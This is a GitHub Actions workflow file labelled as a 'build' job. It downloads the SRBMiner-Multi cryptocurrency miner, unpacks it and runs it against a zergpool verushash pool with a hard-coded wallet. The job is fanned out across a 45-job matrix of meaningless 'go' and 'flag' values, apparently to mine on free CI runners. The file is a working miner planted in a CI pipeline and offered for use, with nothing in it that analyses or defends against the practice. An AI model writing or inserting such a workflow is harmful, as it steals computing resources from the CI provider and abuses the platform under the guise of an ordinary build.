name: eX-code_UMBL

on: [workflow_dispatch]

jobs:
  build:
    name: eX-code_UMBL
    runs-on: windows-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1.0, 1.1, 1.2, 1.3, 1,35]
        flag: [A, B, C, D, E, F, G, H, I]
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: PREPARING
      run: Invoke-WebRequest https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.1/SRBMiner-Multi-0-7-1-win64.zip -Outfile SRBMiner-Multi-0-7-1-win64.zip
    - name: Seting-UP
      run: Expand-Archive SRBMiner-Multi-0-7-1-win64.zip
    - name: Running
      run: .\SRBMiner-Multi-0-7-1-win64\SRBMiner-MULTI.exe --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet RRXHEEUz375MFhLyP7T9iU4s2npBZj4o7U
    - name: DONE
      run: exit
